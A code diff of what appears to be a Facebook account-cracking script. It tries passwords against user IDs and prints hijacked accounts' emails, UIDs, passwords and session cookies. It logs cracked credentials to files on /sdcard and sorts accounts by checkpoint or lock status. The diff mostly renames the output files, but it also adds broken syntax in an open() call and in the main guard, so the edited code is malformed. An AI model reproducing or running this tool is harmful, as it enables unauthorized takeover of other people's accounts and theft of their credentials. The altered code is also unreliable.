@@ -232,7 +232,7 @@ def free(uid,pwx,tl):
                 cid = coki[7:22]
                 print('\r\033[1;32m[√]---------------------[JADU-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                 cek_apk(session,coki)
-                open('/sdcard/Jadugar-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/saran-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
@@ -240,7 +240,7 @@ def free(uid,pwx,tl):
                 cid=coki[24:39]
                 Red = '\033[1;31m'
                 print(f'\r{Red}[×]--------------------[JADU-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
-                open('/sdcard/saran-CP.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/', sdcard/saran.txt'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             elif '/x/checkpoint' in log_cookies:
@@ -248,7 +248,7 @@ def free(uid,pwx,tl):
                 cid=coki[7:22]
                 Red = '\033[1;31m'
                 print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
-                open('/sdcard/saran-2F.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/saran.txt', 'a').write(cid+' | '+ps+'\n')
                 twf.append(cid)
             else:
                 continue
@@ -261,5 +261,5 @@ def free(uid,pwx,tl):
 
         
  
-if __name__ == '__main__':
-    zaib()
+if __name__ == '__main__',
+   xyz()
